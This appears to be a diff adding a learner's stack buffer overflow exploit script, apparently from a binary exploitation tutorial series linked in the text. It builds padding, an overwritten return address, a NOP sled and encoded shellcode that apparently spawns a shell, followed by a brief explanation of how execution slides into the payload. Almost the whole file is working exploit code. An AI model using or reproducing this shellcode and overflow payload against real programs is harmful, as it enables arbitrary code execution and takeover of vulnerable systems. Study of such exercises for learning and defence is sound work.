@@ -1,0 +1,11 @@
+import struct                                                                                                 
+padding = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+eip = struct.pack("I",0xffffd5a0+50)
+nop = "\x90"*100
+payload = "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6    b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\    x54\x8a\xe2\xce\x81"
+print padding+eip+nop+payload
+
+https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=15
+
+eip equals the esp or near the esp, as when the return pointer is poped the esp is after the padding + eip. the nops allow
+the eip to be near along has it hits the nops then the nops go along to the payload
